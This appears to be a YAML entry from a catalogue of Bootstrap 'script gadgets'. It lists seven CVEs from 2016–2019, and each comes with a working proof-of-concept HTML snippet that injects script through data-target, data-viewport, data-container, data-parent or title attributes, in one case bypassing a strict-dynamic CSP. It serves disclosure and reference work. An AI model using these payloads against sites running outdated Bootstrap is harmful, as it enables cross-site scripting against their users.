---
description: The most popular HTML, CSS, and JavaScript framework for developing responsive, mobile first projects on the web.
github: twbs/bootstrap
gadgets:
  <3.4.1 & <4.3.1:
    cve: CVE-2019-8331
    authors:
      - twitter:zozuar
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - title-attr
      - strict-dynamic-csp
      - before-func-call
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `title` attribute. An `hover` interaction is required.
        code: |
          <script nonce="secret" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
          <script nonce="secret" src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-toggle="tooltip" data-html="true" title="<script>alert(document.domain)</script>">Hover me</x>

          <script nonce="secret">
              $("[data-toggle='tooltip']").tooltip();
          </script>
    links:
      - https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/
      - https://github.com/twbs/bootstrap/pull/28236
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (1):
    cve: CVE-2018-20677
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - before-lib-load
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-target` attribute.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-spy="affix" data-target="<img src=x onerror=alert(document.domain)>">XSS</x>
    links:
      - https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (2):
    cve: CVE-2018-20676
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - before-func-call
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-viewport` attribute.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-toggle="tooltip" data-viewport="<img src=x onerror=alert(document.domain)>"></x>

          <script>
              $('[data-toggle="tooltip"]').tooltip();
          </script>
    links:
      - https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (3) & < 4.1.2:
    cve: CVE-2018-14040
    authors:
      - github:1Jesper1
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - href-attr
      - id-attr
      - data-attr
      - before-lib-load
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-parent` attribute. An `click` interaction is required.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(document.domain)>">Click me</x>
    links:
      - https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/
      - https://github.com/twbs/bootstrap/issues/26625
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (4) & < 4.1.2 (2):
    cve: CVE-2018-14041
    authors:
      - github:1Jesper1
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - before-lib-load
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-target` attribute. An `click` interaction is required.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-spy="scroll" data-target="<img src=x onerror=alert(document.domain)>">XSS</x>
    links:
      - https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/
      - https://github.com/twbs/bootstrap/issues/26627
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (5) & < 4.1.2 (3):
    cve: CVE-2018-14042
    authors:
      - github:1Jesper1
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - before-func-call
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-container` attribute. An `hover` interaction is required.
        code: |
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
          <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-toggle="tooltip" data-container="<img src=x onerror=alert(document.domain)>">Hover me</x>

          <script>
              $('[data-toggle="tooltip"]').tooltip();
          </script>
    links:
      - https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/
      - https://github.com/twbs/bootstrap/issues/26627
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
  <3.4.0 (6) & < v4.0.0-beta:
    cve: CVE-2016-10735
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - before-lib-load
    pocs:
      - description: The [Bootstrap](https://github.com/twbs/bootstrap) library was loading HTML from the `data-target` attribute. An `click` interaction is required.
        code: |
          <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
          <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
          <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js"></script>

          <!-- user input -->
          <x data-toggle="collapse" data-target="<img src=x onerror=alert(document.domain)>">Click me</x>
    links:
      - https://gist.github.com/BlackFan/e968b5209637952cca1580dc8ffdfde6
---
